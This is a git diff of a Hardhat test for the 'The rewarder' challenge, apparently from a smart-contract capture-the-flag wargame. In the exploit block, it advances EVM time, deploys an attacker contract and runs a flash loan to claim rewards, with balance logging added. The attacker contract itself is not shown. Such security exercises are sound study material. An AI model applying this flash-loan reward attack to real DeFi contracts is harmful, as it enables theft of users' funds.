@@ -71,8 +71,8 @@ describe('[Challenge] The rewarder', function () {
 
 	it('Exploit', async function () {
 		/** CODE YOUR EXPLOIT HERE */
-		// Travel through time
-		await ethers.provider.send('evm_increaseTime', [5 * 24 * 60 * 60]) // 5 days
+		// Travel through time (5 days)
+		await ethers.provider.send('evm_increaseTime', [5 * 24 * 60 * 60])
 
 		// Deploy evil contract
 		const RewarderAttacker = await ethers.getContractFactory('RewarderAttacker', attacker)
@@ -83,9 +83,19 @@ describe('[Challenge] The rewarder', function () {
 			this.rewardToken.address
 		)
 
-		// Attack
-		this.rewarderAttacker.connect(attacker).executeFlashLoan(TOKENS_IN_LENDER_POOL)
-		this.rewarderAttacker.connect(attacker).withdrawRewards()
+		console.log(
+			'Attacker reward token balance before attack: ',
+			String(await this.rewardToken.balanceOf(attacker.address))
+		)
+
+		// Attack and withdraw
+		await this.rewarderAttacker.connect(attacker).executeFlashLoan(TOKENS_IN_LENDER_POOL)
+		await this.rewarderAttacker.connect(attacker).withdrawRewards()
+
+		console.log(
+			'Attacker reward token balance after attack: ',
+			String(await this.rewardToken.balanceOf(attacker.address))
+		)
 	})
 
 	/** SUCCESS CONDITIONS */
@@ -110,11 +120,6 @@ describe('[Challenge] The rewarder', function () {
 		// The amount of rewards earned should be really close to 100 tokens
 		let delta = ethers.utils.parseEther('100').sub(rewards)
 		expect(delta).to.be.lt(ethers.utils.parseUnits('1', 17))
-
-		console.log(
-			'ATTACKER REWARD BALANCE: ',
-			String(await this.rewardToken.balanceOf(attacker.address))
-		)
 
 		// Attacker finishes with zero DVT tokens in balance
 		expect(await this.liquidityToken.balanceOf(attacker.address)).to.eq('0')
